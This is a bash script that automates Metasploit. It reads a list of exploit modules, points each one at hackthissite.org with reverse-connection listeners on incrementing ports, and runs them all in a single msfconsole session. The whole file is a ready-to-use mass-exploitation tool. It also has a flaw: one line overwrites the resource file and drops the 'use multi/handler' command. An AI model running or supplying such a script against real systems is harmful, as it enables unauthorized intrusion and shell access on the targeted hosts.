#!/bin/bash
# Set RHOST to your website
# Run
# ./runMany.sh ./excellentLinux.txt
if [ $# -ne 1 ]; then
    echo "Usage: $0 <file>"
    exit 1
fi

if [ ! -f "$1" ]; then
    echo "File $1 not found."
    exit 1
fi
export COLOR=false
x=4444
# Start msfconsole and execute commands
echo "use multi/handler" > temp_resource.rc
echo color false > temp_resource.rc

while IFS= read -r line; do
    echo "use $line" >> temp_resource.rc
    echo "set RHOSTS hackthissite.org" >> temp_resource.rc
    echo "set LHOST 0.0.0.0" >> temp_resource.rc
    echo "set LPORT $x" >> temp_resource.rc
    echo "run" >> temp_resource.rc
    ((x++))
    
done < "$1"

msfconsole -q -r temp_resource.rc
rm temp_resource.rc